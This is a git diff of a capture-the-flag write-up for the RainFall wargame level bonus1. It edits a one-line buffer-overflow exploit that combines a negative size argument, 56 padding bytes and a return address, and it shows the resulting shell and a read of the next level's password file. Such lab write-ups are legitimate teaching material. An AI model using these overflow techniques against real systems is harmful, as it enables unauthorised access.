@@ -76,7 +76,7 @@ Due to this, our exploit jumps to the address <code>0x08048482</code> to continu
 
 ## exploit
 ``` shell
-bonus1@RainFall:~$ ./bonus1 -1073741798 $(python -c 'print "\x90" * 56 + "\x08\x04\x84\x82"[::-1]')
+bonus1@RainFall:~$ ./bonus1 -1073741798 $(python -c 'print "F" * 56 + "\x08\x04\x84\x82"[::-1]')
 $ whoami
 bonus2
 $ cat /home/user/bonus2/.pass
